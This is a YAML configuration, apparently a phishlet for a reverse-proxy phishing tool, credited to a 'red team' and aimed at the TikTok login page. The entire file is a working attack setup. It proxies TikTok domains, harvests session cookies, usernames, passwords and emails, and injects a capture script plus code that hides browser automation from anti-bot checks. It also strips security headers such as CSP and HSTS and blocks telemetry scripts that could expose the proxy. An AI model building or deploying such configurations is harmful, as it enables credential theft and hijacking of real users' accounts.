name: "TikTok-Login"
author: "Vanta v5 Red Team"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "tiktok"
    target: "www.tiktok.com"
  - subdomain: "cdn"
    target: "sf16-scmcdn-sg.ibytedtos.com"
auth_urls: 
  - "/login"
  - "/passport/web/login"
landing_path: 
  - "/login"
auth_tokens:
  - {type: "cookie", name: "sessionid"}
  - {type: "cookie", name: "tt_webid"}
  - {type: "cookie", name: "csrf_session_id"}
  - {type: "cookie", name: "tt_csrf_token"}
credentials:
  - {type: "post_param", name: "username", regex: null}
  - {type: "post_param", name: "password", regex: null}
  - {type: "post_param", name: "email", regex: null}
injections:
  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
  - trigger_path: "/login"
    position: "body_end"
    content: |
      (function(){
        // TikTok Anti-Bot Evasion
        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        // Disable right-click for security
        document.addEventListener('contextmenu', event => event.preventDefault());
      })();
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "Strict-Transport-Security"}
path_rewrites:
  - {pattern: "^/$", replace: "/login", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|/slardar/|/mon/|/log", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"login\"]", action_to: "/api/login"}
bridges:
  - {prefix: "/_cdn/", target_host: "sf16-scmcdn-sg.ibytedtos.com", strip_prefix: true, cors: "allow_all"}
cors:
  mode: "allow_all"
  methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
  headers: ["*"]
